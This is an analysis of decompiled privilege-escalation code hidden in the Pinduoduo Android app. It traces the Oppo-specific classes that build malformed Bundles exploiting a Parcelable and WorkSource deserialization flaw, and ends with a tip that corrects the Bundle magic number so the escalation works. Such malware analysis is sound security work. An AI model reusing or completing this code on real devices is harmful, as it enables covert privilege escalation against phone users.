  # Reverse engineering of PDD privilege escalation code

PDD's privilege escalation code for mobile phones from several major manufacturers is similar. They all use WorkSource's deserialization vulnerability. Therefore, here we take Oppo's privilege escalation code as an example to briefly analyze the process.

## Logical sorting
- com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.OppoAlivePullStartup, this class is the class where the oppo model privilege escalation code is located. It inherits com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.CommonAlivePullStartUp, and CommonAlivePullStartUp in turn inherits com.xunmeng.pinduoduo .alive.base.ability.impl.provider.oppoLauncher.OppoLauncherProviderImpl, com.xunmeng.pinduoduo.alive.base.ability.interfaces.provider.BaseBizProviderImpl (BaseBizProviderImpl is implemented in Pinduoduo main App, please refer to version 6.44), BaseBizProviderImpl implementation com.xunmeng.pinduoduo.alive.base.ability.interfaces.provider.IBizProvider:
```java
    package com.xunmeng.pinduoduo.alive.base.ability.interfaces.provider;
    
    public interface IBizProvider {
        boolean hasPermission();
    }
```

    The code of the IBizProvider interface class contains only one method hasPermission().
    
    There is some privilege escalation code in the CommonAlivePullStartUp class, which is used by all levels of the Android SDK, including 31.
    There are intParcelClzMap() and initFuncMap() methods in the CommonAlivePullStartUp class. The initFuncMap() method is used to construct the privilege escalation bundle. The privilege escalation bundle stores an object of class OppoLauncherProviderImpl. This object should be generated after OppoLauncherProviderImpl implements the Function interface class. an object:
```java
    public void initFuncMap() {
            this.sFuncMakeBundleMap.put("android.os.WorkSource", new OppoLauncherProviderImpl() { // from class: com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.CommonAlivePullStartUp.1
                public Bundle makeBundle(Intent intent) {
                    return CommonAlivePullStartUp.this.makeBundleForWorkSource(intent);
                }
            });
        }
```  
    Each manufacturer's privilege escalation code inherits the CommonAlivePullStartUp class and implements its own intParcelClzMap() and initFuncMap() methods:
```java
    /* JADX INFO: Access modifiers changed from: protected */
        @Override // com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.CommonAlivePullStartUp
        public void intParcelClzMap() {
            List asList = Arrays.asList("com.mediatek.internal.telephony.ims.MtkDedicateDataCallResponse", "com.android.internal.telephony.OperatorInfo");
            for (int i = 26; i <= 29; i++) {
                this.sParcelableClzMap.put(Integer.valueOf(i), asList);
            }
            this.sParcelableClzMap.put(30, Arrays.asList("com.oplus.orms.info.OrmsNotifyParam", "com.mediatek.internal.telephony.ims.MtkDedicateDataCallResponse"));
            super.intParcelClzMap();
        }
    
    
    /* JADX INFO: Access modifiers changed from: protected */
        @Override // com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.CommonAlivePullStartUp
        public void initFuncMap() {
            super.initFuncMap();
            this.sFuncMakeBundleMap.put("com.mediatek.internal.telephony.ims.MtkDedicateDataCallResponse", new OppoLauncherProviderImpl() { // from class: com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.OppoAlivePullStartup.1
                public Bundle makeBundle(Intent intent) {
                    return OppoAlivePullStartup.this.makeBundleForOppoSinceOToQ(intent, "com.mediatek.internal.telephony.ims.MtkDedicateDataCallResponse");
                }
            });
            this.sFuncMakeBundleMap.put("com.android.internal.telephony.OperatorInfo", new OppoLauncherProviderImpl() { // from class: com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.OppoAlivePullStartup.2
                public Bundle makeBundle(Intent intent) {
                    return OppoAlivePullStartup.this.makeBundleForOppoSinceOToQ(intent, "com.android.internal.telephony.OperatorInfo");
                }
            });
            this.sFuncMakeBundleMap.put("com.oplus.orms.info.OrmsNotifyParam", new OppoLauncherProviderImpl() { // from class: com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup.OppoAlivePullStartup.3
                public Bundle makeBundle(Intent intent) {
                    return OppoAlivePullStartup.this.makeBundleForOppoForR(intent);
                }
            });
        }
```
    
    Among them, the code of the Function interface class is as follows:
```java
    package com.xunmeng.pinduoduo.android_pull_ability_comp.pullstartup;
    
    import android.content.Intent;
    import android.os.Bundle;
    
    public interface Function {
        Bundle makeBundle(Intent intent);
    }
```   
- Continuing to sort it out, there is a makeBundle(Intent intent) method in the AlivePullStartUpImpl class. This method calls the makeBundle(Intent intent) method through the this.mMakeBundleFunction property (that is, the makeBundle(Intent intent) method of the Function interface class. The implementation of this method In the initFuncMap() method of the XXAlivePullStartup class, it passes in an intent to write the bundle used for vulnerability privilege escalation). This is very important. When the upper layer exploits the vulnerability, it should call the makeBundle(Intent intent) method of AlivePullStartUpImpl to obtain an Bundle to exploit the vulnerability:
```java   
    public Bundle makeBundle(Intent intent) {
            if (intent == null) {
                Logger.w("SpecialPullAbility.Comp", "make empty bundle");
                return new Bundle();
            }
            Logger.i("SpecialPullAbility.Comp", "make bundle");
            if (this.mMakeBundleFunction == null) {
                Logger.i("SpecialPullAbility.Comp", "no make bundle function");
                return Bundle.EMPTY;
            }
            Bundle makeBundle = this.mMakeBundleFunction.makeBundle(intent);
            return makeBundle == null ? Bundle.EMPTY : makeBundle;
        }
```    
    
    There is also a startAccount(Intent intent) method in the AlivePullStartUpImpl class, and the realStartAccount(Intent intent) method is called through this method. These two methods are to send the constructed deserialization vulnerability code to AMS to complete the privilege escalation:
```java
    private boolean realStartAccount(Intent intent) {
            Logger.i("SpecialPullAbility.Comp", "real start accountSettings activity.");
            try {
                BotBaseApplication.getContext().startActivity(intent);
                return true;
            } catch (Exception e) {
                StartPullUpTrack.trackScene("start_account_exception");
                Logger.e("SpecialPullAbility.Comp", e);
                return false;
            }
    }
```  
- Going up from class AlivePullStartUpImpl is the class: com.xunmeng.pinduoduo.alive.base.ability.comp.Main, which is the upper-level class used by privilege escalation vulnerabilities. Create an AlivePullStartUpImpl object in this class to complete privilege escalation. operate:
```java    
    public class Main {
        private static final String TAG = null;
    
        public static IAlivePullStartUp getAlivePullStartUp() {
            Logger.i("LVBA.Plugin.Main", "getAlivePullStartUp");
            return new AlivePullStartUpImpl();
        }
    
        public static IStrategy createStrategyProxy(String str) {
            Logger.i("LVBA.Plugin.Main", "createStrategyProxy: " + str);
            return (IStrategy) ComponentContainer.getComponent(str);
        }
    
        public static IAliveBaseAbility getAliveBaseAbility() {
            Logger.i("LVBA.Plugin.Main", "getAliveBaseAbilityInstance");
            return new AliveBaseAbilityImpl();
        }
    
        public static IReceiver createReceiverProxy(String str) {
            Logger.i("LVBA.Plugin.Main", "createReceiverProxy: " + str);
            return (IReceiver) ComponentContainer.getComponent(str);
        }
    
        public static IVivoBindServiceComp getLauncherDetectVivoBindService() {
            Logger.i("LVBA.Plugin.Main", "getLauncherDetectVivoBindService");
            return VivoBindService.getInstance();
        }
    
        public static Boolean hasComponent(String str) {
            Logger.i("LVBA.Plugin.Main", "hasComponent: " + str);
            return Boolean.valueOf(ComponentContainer.getComponent(str) != null);
        }
    
        public static IActivity createActivityProxy(String str) {
            Logger.i("LVBA.Plugin.Main", "createActivityProxy: " + str);
            return (IActivity) ComponentContainer.getComponent(str);
        }
    
        public static IService createServiceProxy(String str) {
            Logger.i("LVBA.Plugin.Main", "createServiceProxy: " + str);
            return (IService) ComponentContainer.getComponent(str);
        }
    
        public static Set getComponentNames() {
            Logger.i("LVBA.Plugin.Main", "getComponentNames");
            return ComponentContainer.getComponentNames();
        }
    
        public static IPluginPAStrategyUtil getIPluginPAStrategyUtil() {
            Logger.i("LVBA.Plugin.Main", "getIPluginPAStrategyUtil");
            return new PluginPAStrategyUtilImpl();
        }
    }
```
## Possible problems
- When constructing a privilege-elevated bundle, the following error may be reported:
 ```
 java.lang.IllegalStateException: Bad magic number for Bundle: 0x444e4c42
```
This is due to an error in jadx decompiling the PDD code, and the magic number of the bundle is wrong. It should be changed to 0x4C444E42 to solve the problem.

Statement: The analysis here is for learning reference only. Illegal use is strictly prohibited, otherwise the illegal users will be responsible for the consequences!
